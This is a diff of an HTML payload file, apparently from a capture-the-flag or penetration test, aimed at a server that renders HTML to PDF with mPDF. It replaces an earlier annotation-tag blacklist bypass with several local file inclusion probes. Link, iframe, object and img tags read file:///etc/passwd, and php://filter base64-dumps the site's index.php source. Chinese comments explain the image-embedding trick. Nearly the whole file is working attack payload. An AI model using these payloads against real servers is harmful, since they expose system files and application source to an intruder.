@@ -1,13 +1,27 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Payload - Bypass mPDF Blacklist</title>
+    <title>Visual Payload</title>
+    <link rel="stylesheet" href="file:///etc/passwd">
+    <link rel="stylesheet" href="php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php">
 </head>
 <body>
-    <h1>Testing Blacklist Bypass</h1>
-    
-    <annotation file="./php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" content="Source" icon="Graph" title="Source_PHP"></annotation>
-    
+    <h1>Visual LFI Test</h1>
+    <p>Targeting /etc/passwd and index.php</p>
+    <hr>
+
+    <h3>Test 2: iframe (標準嵌入)</h3>
+    <iframe src="file:///etc/passwd" style="width:100%; height:200px;"></iframe>
+    <iframe src="php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" style="width:100%; height:200px;"></iframe>
+
+    <h3>Test 3: object (物件嵌入)</h3>
+    <object data="file:///etc/passwd" style="width:100%; height:200px;"></object>
+
+    <h3>Test 4: img (偽裝成圖片)</h3>
+    <p>如果後端會自動把圖片轉成 Base64，可能會把檔案內容當成圖檔處理，或者把檔案路徑/內容印在替代文字 (alt) 區塊：</p>
+    <img src="file:///etc/passwd" alt="IMG_Passwd_Test">
+    <img src="php://filter/read=convert.base64-encode/resource=/var/www/html/public/index.php" alt="IMG_Source_Test">
+
 </body>
 </html>
